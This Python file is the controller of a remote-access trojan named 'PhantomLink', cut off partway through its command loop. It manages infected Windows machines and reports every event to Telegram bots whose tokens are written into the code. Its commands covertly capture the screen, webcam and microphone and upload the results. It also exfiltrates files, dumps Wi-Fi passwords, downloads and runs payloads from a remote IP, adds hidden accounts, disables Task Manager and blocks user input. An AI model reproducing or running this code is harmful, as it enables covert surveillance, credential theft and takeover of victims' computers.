import base64
import socket
import time
import threading
import struct
from datetime import datetime
import requests
from notifypy import Notify

version = 11.7 #7/3/2026

HOST = "0.0.0.0"
PORT = 5000

CHAT_ID = "6042298920"




def tel_logger(log):
    url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': log
    }
    _response = requests.post(url, data=data)


def send_log2(log):
    url = f"https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendMessage"
    data = {
        'chat_id': CHAT_ID,
        'text': log
    }
    _response = requests.post(url, data=data)


class ConnectionHealth:
    """Track connection quality and performance"""

    def __init__(self):
        self.latency = []
        self.failed_commands = 0
        self.successful_commands = 0
        self.last_response_time = time.time()
        self.connection_quality = 100

    def record_command(self, success, response_time):
        """Track command success/failure"""
        if success:
            self.successful_commands += 1
            self.latency.append(response_time)
            if len(self.latency) > 100:
                self.latency.pop(0)
        else:
            self.failed_commands += 1

        self.update_quality()

    def update_quality(self):
        """Calculate connection quality score"""
        total = self.successful_commands + self.failed_commands
        if total == 0:
            return

        success_rate = (self.successful_commands / total) * 100
        avg_latency = sum(self.latency) / len(self.latency) if self.latency else 0

        # Quality = 70% success rate + 30% latency score
        latency_score = max(0.0, 100 - (avg_latency / 10))
        self.connection_quality = (success_rate * 0.7) + (latency_score * 0.3)

    def get_avg_latency(self):
        """Get average response time"""
        return sum(self.latency) / len(self.latency) if self.latency else 0

    def get_stats(self):
        """Get formatted stats"""
        return {
            'quality': f"{self.connection_quality:.1f}%",
            'latency': f"{self.get_avg_latency():.2f}s",
            'success_rate': f"{(self.successful_commands / max(1, self.successful_commands + self.failed_commands) * 100):.1f}%",
            'total_commands': self.successful_commands + self.failed_commands
        }



class ClientManager:
    def __init__(self):
        self.clients = {}
        self.client_counter = 0
        self.lock = threading.Lock()

    def add_client(self, conn, addr):
        with self.lock:
            self.client_counter += 1
            client_id = self.client_counter

            # Get credentials from client
            try:
                conn.settimeout(15.0)

                # Receive password
                password_data = self._recv_message(conn)
                if not password_data:
                    conn.close()
                    return None

                password = password_data.decode('utf-8', errors='ignore').strip()
                if password != "PhantomLink":
                    print(f"[!] Invalid password from {addr[0]}")
                    conn.close()
                    return None

                # receive username
                username_data = self._recv_message(conn)
                if username_data:
                    username = username_data.decode('utf-8', errors='ignore').strip()
                else:
                    username = "Unknown"
            except Exception as e:
                print(f"[!] Failed to get credentials: {e}")
                try:
                    conn.close()
                except:
                    pass
                return None

            # NEW: Check for duplicate username+IP and remove old connection
            duplicate_id = None
            was_connected_to_duplicate = False  # Track if user was interacting with old client

            for cid, client in list(self.clients.items()):
                if client['username'] == username and client['addr'][0] == addr[0]:
                    duplicate_id = cid
                    # Check if this client has an active interaction (lock is being held)
                    # We'll set a flag to auto-reconnect
                    break

            if duplicate_id:
                print(
                    f"[!] Duplicate connection from {username}@{addr[0]}, removing old connection (ID: {duplicate_id})")
                tel_logger(
                    f"[!] Duplicate detected: {username}@{addr[0]}, switching from ID {duplicate_id} to {client_id}")

                old_client = self.clients[duplicate_id]
                old_client['active'] = False

                # Store the new client_id for auto-reconnect
                old_client['replacement_id'] = client_id

                try:
                    old_client['conn'].close()
                except:
                    pass
                del self.clients[duplicate_id]

                # Print message to help user know to reconnect
                print(f"[*] Old session disconnected. New session is ID: {client_id}")

            client_info = {
                'id': client_id,
                'conn': conn,
                'addr': addr,
                'username': username,
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'last_seen': datetime.now(),
                'active': True,
                'keepalive_failures': 0,
                'lock': threading.Lock(),
                'command_in_progress': False,
                'replacement_id': None,
                'health': ConnectionHealth()
            }

            self.clients[client_id] = client_info
            print(f"[+] New client connected: {username}@{addr[0]} (ID: {client_id})")

            # Send notifications
            def send_hi():
                url = f"https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendMessage"
                data = {
                    'chat_id': CHAT_ID,
                    'text': "New client connected!"
                            f"\nClient [{username}] has been connected."
                }
                _response = requests.post(url, data=data)

            send_hi()

            def send_log():
                url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
                data = {
                    'chat_id': CHAT_ID,
                    'text': "New client connected!"
                            f"\nClient [{username}] has been connected."
                            f"\n ID: {client_id}"
                            f"\n@{addr[0]}"
                }
                _response = requests.post(url, data=data)

            send_log()

            notification = Notify()
            notification.application_name = "PhantomLink"
            notification.title = "New Client Connected!"
            notification.message = f"Client: [{username}] has been connected!"
            notification.icon = "icon.png"
            notification.send()

            return client_id

    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                client = self.clients[client_id]
                client['active'] = False
                print(f"[-] Client disconnected: {client['username']}@{client['addr'][0]} (ID: {client_id})")

                def send_log1():
                    url = f"https://api.telegram.org/bot8282137342:AAFd93wSzwEVliRmm2kSc1AWUf1tqv68Tv0/sendMessage"
                    data = {
                        'chat_id': CHAT_ID,
                        'text': "Client disconnected!"
                                f"\nClient [{client['username']}] has been disconnected."
                                f"\n ID: {client_id}"
                                f"\n@{client['addr'][0]}"
                    }
                    _response = requests.post(url, data=data)

                send_log1()
                send_log2("Client disconnected!"
                                f"\nClient [{client['username']}] has been disconnected."
                                f"\n ID: {client_id}"
                                f"\n@{client['addr'][0]}")

                notification = Notify()
                notification.application_name = "PhantomLink"
                notification.title = f"{client['username']} Disconnected!"
                notification.message = f"Client: {client['username']} has been disconnected!"
                notification.icon = "icon.png"
                try:
                    notification.send()
                except:
                    pass

                try:
                    client['conn'].close()
                except:
                    pass
                del self.clients[client_id]

    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)

    def list_clients(self):
        with self.lock:
            return dict(self.clients)

    def update_last_seen(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['last_seen'] = datetime.now()
                self.clients[client_id]['keepalive_failures'] = 0  # Reset failure counter

    def increment_keepalive_failure(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['keepalive_failures'] += 1
                return self.clients[client_id]['keepalive_failures']
        return 0

    def is_client_connected(self, client_id):
        with self.lock:
            return client_id in self.clients and self.clients[client_id]['active']

    def _send_message(self, conn, data):
        """Send data with length prefix"""
        try:
            if isinstance(data, str):
                data = data.encode('utf-8')

            # Send length (4 bytes)
            msg_len = len(data)
            conn.sendall(struct.pack('!I', msg_len))
            # Send data
            conn.sendall(data)
            return True
        except Exception as e:
            print(f"[!] Send error: {e}")
            return False

    def _recv_message(self, conn):
        """Receive data with length prefix"""
        try:
            # Receive the length (4 bytes)
            raw_msglen = self._recv_exactly(conn, 4)
            if not raw_msglen:
                return None

            # Check if it's HTTP request
            if raw_msglen.startswith(b'GET ') or raw_msglen.startswith(b'POST') or raw_msglen.startswith(
                    b'HTTP') or raw_msglen.startswith(b'HEAD'):
                return None  # Silent close

            try:
                msglen = struct.unpack('!I', raw_msglen)[0]
            except struct.error:
                return None  # Silent close for invalid format

            # Sanity check for message length
            if msglen > 10 * 1024 * 1024:  # 10MB limit
                return None  # Silent close

            # Receive the actual message
            return self._recv_exactly(conn, msglen)
        except:
            return None

    def _recv_exactly(self, conn, n):
        """Helper to receive exactly n bytes"""
        data = b''
        while len(data) < n:
            try:
                packet = conn.recv(n - len(data))
                if not packet:
                    return None
                data += packet
            except socket.timeout:
                return None
            except Exception:
                return None
        return data


def handle_client_connection(client_manager, conn, addr):
    """Handle individual client connection"""
    client_id = None
    keepalive_thread = None
    keepalive_event = threading.Event()

    try:
        client_id = client_manager.add_client(conn, addr)
        if not client_id:
            return

        conn.settimeout(300.0)  # 5 minutes timeout

        # Start keepalive in separate thread
        keepalive_thread = threading.Thread(
            target=keepalive_handler,
            args=(client_manager, client_id, keepalive_event),
            daemon=True
        )
        keepalive_thread.start()

        # Simple approach: just keep the connection alive
        # The real interaction happens in interact_with_client function
        while True:
            try:
                client = client_manager.get_client(client_id)
                if not client or not client['active']:
                    break

                # Just sleep and check periodically
                time.sleep(5)

            except Exception as e:
                print(f"[!] Connection error for client {client_id}: {e}")
                break


    except Exception as e:
        print(f"[!] Client connection error: {e}")
        import traceback
        traceback.print_exc()
        tel_logger(f"[!] Connection handler error: {e}\n{traceback.format_exc()}")
    finally:
        # Signal keepalive thread to stop
        if keepalive_thread:
            keepalive_event.set()

        if client_id:
            time.sleep(1)
            client_manager.remove_client(client_id)


def keepalive_handler(client_manager, client_id, stop_event):
    """Separate thread for handling keepalive"""
    if stop_event.wait(10):
        return

    while not stop_event.is_set():
        try:
            client = client_manager.get_client(client_id)
            if not client or not client['active']:
                break

            if client.get('command_in_progress', False):
                time.sleep(2)
                continue

            conn = client['conn']

            try:
                conn.settimeout(10.0)

                if not client_manager._send_message(conn, "PING"):
                    failure_count = client_manager.increment_keepalive_failure(client_id)

                    if failure_count >= 3:
                        print(f"[!] Client {client_id} keepalive failed permanently")
                        tel_logger(f"[!] Client {client_id} keepalive failed permanently")
                        client['active'] = False
                        break
                else:
                    response = client_manager._recv_message(conn)

                    if response and response == b"PONG":
                        client_manager.update_last_seen(client_id)
                    else:
                        failure_count = client_manager.increment_keepalive_failure(client_id)

                        if failure_count >= 3:
                            print(f"[!] Client {client_id} keepalive failed permanently")
                            tel_logger(f"[!] Client {client_id} keepalive failed permanently")
                            client['active'] = False
                            break

            except Exception as e:
                if not stop_event.is_set():
                    print(f"[!] Keepalive error for client {client_id}: {e}")
                    tel_logger(f"[!] Keepalive error for client {client_id}: {e}")
                break
            finally:
                try:
                    conn.settimeout(300.0)
                except:
                    pass

            # Wait before next keepalive, but check for stop event
            for _ in range(15):  # Check every 2 seconds for 30 seconds total
                if stop_event.wait(2):
                    return

        except Exception as e:
            if not stop_event.is_set():
                print(f"[!] Keepalive handler error for client {client_id}: {e}")
                tel_logger(f"[!] Keepalive handler error for client {client_id}: {e}")
            break


def show_clients(client_manager):
    """Display list of connected clients"""
    clients = client_manager.list_clients()
    if not clients:
        print("\n[!] No clients connected.")
        return

    print("\n" + "=" * 70)
    print("CONNECTED CLIENTS")
    print("=" * 70)
    print(f"{'ID':<4} {'Username':<15} {'IP Address':<15} {'Connected At':<20}")
    print("-" * 70)

    for client_id, client in clients.items():
        print(f"{client_id:<4} {client['username']:<15} {client['addr'][0]:<15} {client['connected_at']:<20}")

    print("=" * 70)


def interact_with_client(client_manager, client_id):
    """Interactive shell session with selected client"""
    client = client_manager.get_client(client_id)
    if not client:
        print(f"[!] Client {client_id} not found.")
        return 'continue'

    conn = client['conn']
    original_timeout = None
    username = client['username']
    addr = client['addr']

    print(f"\n[+] Connected to {username}@{addr[0]}")
    print("[+] Type 'back' to return to client selection, 'exit' to quit")

    health = client['health']
    stats = health.get_stats()
    print(f"[Health] Quality: {stats['quality']} | Latency: {stats['latency']} | Commands: {stats['total_commands']}")

    # Start health monitoring thread
    health_stop = threading.Event()

    def health_monitor():
        """Display health stats every 2.5 minutes"""
        while not health_stop.is_set():
            if health_stop.wait(150):  # 2.5 minutes = 150 seconds
                break
            stats = health.get_stats()
            print(
                f"\n[Health] Quality: {stats['quality']} | Latency: {stats['latency']} | Success Rate: {stats['success_rate']}")

    health_thread = threading.Thread(target=health_monitor, daemon=True)
    health_thread.start()

    try:
        # Set timeout for interactive commands
        original_timeout = conn.gettimeout()
        conn.settimeout(120.0)
    except:
        pass

    try:
        # Set timeout for interactive commands
        original_timeout = conn.gettimeout()
        conn.settimeout(300.0)

        while True:
            # Check if client is still connected
            if not client_manager.is_client_connected(client_id):
                print("[!] Client disconnected")

                # NEW: Check if there's a replacement connection
                replacement_id = client.get('replacement_id')
                if replacement_id and client_manager.is_client_connected(replacement_id):
                    print(f"[+] Detected new connection from same client (ID: {replacement_id})")
                    print(f"[+] Auto-switching to new connection...")
                    time.sleep(1)
                    # Recursively connect to the new client
                    return interact_with_client(client_manager, replacement_id)
                else:
                    # Check if a new client with same username/IP exists
                    clients = client_manager.list_clients()
                    for cid, c in clients.items():
                        if c['username'] == username and c['addr'][0] == addr[0]:
                            print(f"[+] Found reconnected client (ID: {cid})")
                            print(f"[+] Auto-switching to new connection...")
                            time.sleep(1)
                            return interact_with_client(client_manager, cid)

                break

            cmd = input(f"Shell[{username}]> ").strip()

            if cmd.lower() == 'back':
                break
            elif cmd.lower() == 'exit':
                # Send exit command to client
                if client_manager._send_message(conn, f"CMD:{cmd}"):
                    time.sleep(1)  # Give client time to process
                return 'exit'
            elif cmd == 'screenshot':
                command2 = (
                    'powershell -command "'
                    'Add-Type -AssemblyName System.Windows.Forms; '
                    'Add-Type -AssemblyName System.Drawing; '
                    '$bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, '
                    '[System.Windows.Forms.SystemInformation]::VirtualScreen.Height); '
                    '$graphics = [Drawing.Graphics]::FromImage($bmp); '
                    '$graphics.CopyFromScreen([System.Windows.Forms.SystemInformation]::VirtualScreen.X, '
                    '[System.Windows.Forms.SystemInformation]::VirtualScreen.Y, 0, 0, $bmp.Size); '
                    '$path = Join-Path $env:USERPROFILE \\"screenshot.png\\"; '
                    '$bmp.Save($path)"'
                )
                path2 = "%USERPROFILE%\\screenshot.png"
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Screenshot from [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f'Screenshot Taken [{username}]')
                    client['command_in_progress'] = False

                command3 = f'curl -F "photo=@{path2}" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendPhoto?chat_id=6042298920'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    client['command_in_progress'] = False

            elif cmd == 'send':
                path = input("FULL Path of file: ")
                command2 = f'curl -F "document=@{path}" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'File from [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"File: {path} sent to Server [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'get':
                name = input("FULL File name: ")
                path_to_save = input("FULL PATH to save: ")
                command2 = f'curl http://81.10.55.8/{name} -o "{path_to_save}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"File: {name} sent to client [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'camera':
                camera = input("Select the camera: ")
                output_path = (r"$env:USERPROFILE\webcam.jpg")
                command3 = (
                    f'powershell -Command "Start-Process \\"%USERPROFILE%\\ffmpeg\\bin\\ffmpeg.exe\\" '
                    f'-ArgumentList \'-f dshow -y -i video=\\"{camera}\\" -frames:v 1 -update 1 \\"{output_path}"\' '
                    '-NoNewWindow -Wait"'
                )
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"CameraShoot Taken [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False
                command4 = 'curl -F "document=@%USERPROFILE%/webcam.jpg" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command4}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Cam Pic from [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Photo Sent\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'devices':
                command2 = '"%USERPROFILE%/ffmpeg/bin/ffmpeg.exe" -list_devices true -f dshow -i dummy'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Devices [{username}]: {response.decode('utf-8', errors='ignore')}")
                    send_log2(f"Devices of [{username}]\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'wifi':
                command1 = 'netsh wlan show profiles'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command1}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    name = input("Select network: ")
                    command2 = f'netsh wlan show profile name="{name}" key=clear | findstr "Key Content"'
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response2 = client_manager._recv_message(conn)
                    if response2:
                        print(response2.decode('utf-8', errors='ignore'))
                        client['command_in_progress'] = False
                        tel_logger(f"Wi-Fi password of [{username}] for the network: {name} is\n{response.decode('utf-8', errors='ignore')}")
                        send_log2(f"Wi-Fi password of [{username}] for the network: {name} is\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'extract':
                path = input("FULL Path to file: ")
                path2 = input("FULL path to extract: ")
                command2 = f'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "{path}" "{path2}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Extracted File [{username}]: {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'sys' or cmd == 'system':
                command2 = 'systeminfo'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"(sys) [{username}]\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'task':
                command2 = 'tasklist'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Tasks List [{username}]\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'copy':
                path = input("FULL file path: ")
                path2 = input("FULL path to copy: ")
                command2 = f'xcopy "{path}" "{path2}" /s /i /y'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Copied [{username}] {path} to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'shutdown' or cmd == 'off':
                command2 = 'shutdown /s /f /t 0'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Shutting down (PC) [{username}] . . . .')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Client [{username}] Shutdown\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'restart':
                command2 = 'shutdown /r /f /t 0'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Restarting (PC) [{username}] . . . .')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Client [{username}] Restarting\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'cut':
                path = input("FULL path: ")
                path2 = input("Move to: ")
                command2 = f'move "{path}" "{path2}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"File [{username}] {path} moved to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'record':
                mic = input("Select mic: ")
                period = input("Seconds: ")
                tel_logger(f"Recording Audio Now . . . .")
                ffmpeg_path = r'%USERPROFILE%\ffmpeg\bin\ffmpeg.exe'
                output_path = r'%USERPROFILE%\mic.wav'
                command2 = f'powershell -Command "Start-Process \'{ffmpeg_path}\' -ArgumentList \'-f dshow -y -i audio=\\"{mic}\\" -t {period} \\"{output_path}\\"\' -NoNewWindow -Wait"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Audio Record Finished for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")

                command3 = 'curl -F "document=@%USERPROFILE%\\mic.wav" https://api.telegram.org/bot7582328674:AAEihbfTdGUQ-xIVZkYUcZ6NTuSpT4c9nyw/sendDocument?chat_id=6042298920'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    send_log2(f'Voice recording [{username}]:')
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Audio Sent\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'ffmpeg':
                command2 = r'curl http://81.10.55.8/ffmpeg.rar -o "%USERPROFILE%\ffmpeg.rar"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"FFMPEG setting up for [{username}]")
                    send_log2(f'FFMPEG setting up for [{username}]')

                command3 = r'"C:/Program Files/WinRAR/WinRAR.exe" x -ibck -inul "%USERPROFILE%/ffmpeg.rar" "%USERPROFILE%"'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command3}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                print("\nSetting up 'ffmpeg'. Please Wait at least 10 Minutes. \n")
                tel_logger(f"Setting up 'ffmpeg' for [{username}]. Please Wait at least 10 Minutes.")
                tel_logger(f"FFMPEG\n\n{response.decode('utf-8', errors='ignore')}")
                client['command_in_progress'] = False

            elif cmd == 'ip':
                command2 = 'powershell -Command "(Invoke-WebRequest -uri \'https://api.ipify.org\').Content"'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Global IP for {username}: {response.decode('utf-8', errors='ignore')}")

            elif cmd == 'lock':
                command2 = 'rundll32.exe user32.dll,LockWorkStation'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Locked User [{username}]\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'disable task manager':
                command2 = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Task Manager Disabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'enable task manager':
                command2 = r'REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /f'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Task Manager Enabled for [{username}]\n\n{response.decode('utf-8', errors='ignore')}")

            elif cmd == 'inject':
                name = input("FULL name of file: ")
                command2 = f'curl -O http://81.10.55.8/{name} && start /B "" "{name}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break

                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    send_log2(f"Software {name} injected and ran on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

                continue

            elif cmd == 'user':
                command2 = 'net user PhantomLink 8211 /add'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Added PhantomLink user with password: 8211 on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False
                admin = input("Admin? (y/n): ")
                if admin == 'y':
                    command4 = r'REG ADD "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v PhantomLink /t REG_DWORD /d 0 /f'
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{command4}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
                    if response:
                        print(response.decode('utf-8', errors='ignore'))
                        tel_logger(f"(User Admin)\n{response.decode('utf-8', errors='ignore')}")
                        client['command_in_progress'] = False

            elif cmd == 'hide':
                path = input("FULL path to the file/folder: ")
                command2 = f'attrib +h +s "{path}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"File/Folder {path} made hidden on [{username}]\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'archive':
                path = input("FULL path of folder: ")
                path2 = input("Save to: ")
                command2 = f'"C:\\Program Files\\WinRAR\\rar.exe" a -r "{path2}" "{path}"'
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"[{username}]\nFile {path} achived to {path2}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'alert':
                name = input("Title: ")
                name2 = input("Message: ")
                command2 = f'powershell -Command "Add-Type -AssemblyName Microsoft.VisualBasic; [Microsoft.VisualBasic.Interaction]::MsgBox(\'{name2}\', \'Critical\', \'{name}\')"'
                with client['lock']:
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"PopUp window appeared on [{username}]\nMessage: {name2}\nwith title{name}\n\n{response.decode('utf-8', errors='ignore')}")

                continue

            elif cmd == 'block':
                period = input("ALERT: (Must be ADMIN).\nSeconds: ")
                command2 = fr'''powershell -Command "$code = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlockIt);'; $type = Add-Type -MemberDefinition $code -Name 'InputBlocker' -Namespace 'Win32' -PassThru; $type::BlockInput($true); Start-Sleep -Seconds {period}; $type::BlockInput($false)"'''
                tel_logger(f"Blocking Inputs for {period} Seconds")
                with client['lock']:
                    client['command_in_progress'] = True
                    if not client_manager._send_message(conn, f"CMD:{command2}"):
                        client['command_in_progress'] = False
                        break
                    response = client_manager._recv_message(conn)
                if response:
                    print(response.decode('utf-8', errors='ignore'))
                    tel_logger(f"Inputs Blocked on [{username}] for {period}\n\n{response.decode('utf-8', errors='ignore')}")
                    client['command_in_progress'] = False

            elif cmd == 'hosts':
                rule = input("block / unblock: ")
                if rule.strip().lower() == 'block':
                    link = input("Link to website: ")
                    command2 = f'echo 127.0.0.1 {link} >> %WINDIR%\\System32\\drivers\\etc\\hosts'
                    with client['lock']:
                        client['command_in_progress'] = True
                        if not client_manager._send_message(conn, f"CMD:{command2}"):
                            client['command_in_progress'] = False
                            break
                        response = client_manager._recv_message(conn)
